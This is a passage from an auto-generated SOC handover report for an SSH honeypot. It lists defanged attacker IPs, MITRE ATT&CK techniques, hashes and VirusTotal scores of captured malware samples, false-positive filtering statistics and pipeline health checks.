| `103.59.94[.]124` | **7** | 2026-05-27 06:02 | 2026-05-27 06:07 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `124.29.226[.]186` | **3** | 2026-05-27 05:52 | 2026-05-27 05:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `13.59.59[.]233` | **3** | 2026-05-27 05:57 | 2026-05-27 05:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `61.190.137[.]130` | **2** | 2026-05-27 07:43 | 2026-05-27 07:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]138` | **2** | 2026-05-27 06:43 | 2026-05-27 06:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]108` | **2** | 2026-05-27 07:20 | 2026-05-27 07:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.156[.]170` | 1 | 2026-05-27 09:06 | 2026-05-27 09:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.18.182[.]202` | 1 | 2026-05-27 05:58 | 2026-05-27 05:59 | 61s | 1 | `T1110.001` | 🟢 LOW |
| `113.31.115[.]157` | 1 | 2026-05-27 05:29 | 2026-05-27 05:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.127[.]3` | 1 | 2026-05-27 05:36 | 2026-05-27 05:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.71.78[.]68` | 1 | 2026-05-27 05:02 | 2026-05-27 05:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]159` | 1 | 2026-05-27 07:10 | 2026-05-27 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-05-27 07:05 | 2026-05-27 07:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `191.101.59[.]89` | 1 | 2026-05-27 09:11 | 2026-05-27 09:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.189.25[.]100` | 1 | 2026-05-27 09:05 | 2026-05-27 09:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.128.77[.]56` | 1 | 2026-05-27 04:07 | 2026-05-27 04:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.133.130[.]103` | 1 | 2026-05-27 05:28 | 2026-05-27 05:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.64.61[.]184` | 1 | 2026-05-27 09:51 | 2026-05-27 09:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-27 05:08 | 2026-05-27 05:09 | 32s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]88` | 1 | 2026-05-27 05:08 | 2026-05-27 05:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `70.54.182[.]130` | 1 | 2026-05-27 04:37 | 2026-05-27 04:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.76.146[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 7 |
| `98.158.129[.]28` | CA | Colosseum Online Inc. | **100** ⚠️ | 1 |
| `193.122.68[.]142` | SA | Oracle Public Cloud | **100** ⚠️ | 2 |
| `66.132.195[.]108` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `13.59.59[.]233` | US | Amazon Technologies Inc. | **100** ⚠️ | 35 |
| `191.101.59[.]89` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 10 |
| `152.200.205[.]179` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 50 |
| `66.132.172[.]138` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `160.153.175[.]11` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 100 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 47 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 46 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |

---

## 🔕 False Positive Summary (62 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 26 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 32 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 327 cases |
| Tool 34  | Credential Extractor        | ✅ 93 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 62 filtered (19.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 46 priority case(s) shown individually · 28 recon entry/entries in table (13 group(s) consolidating 204 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-27T09:59:42Z_
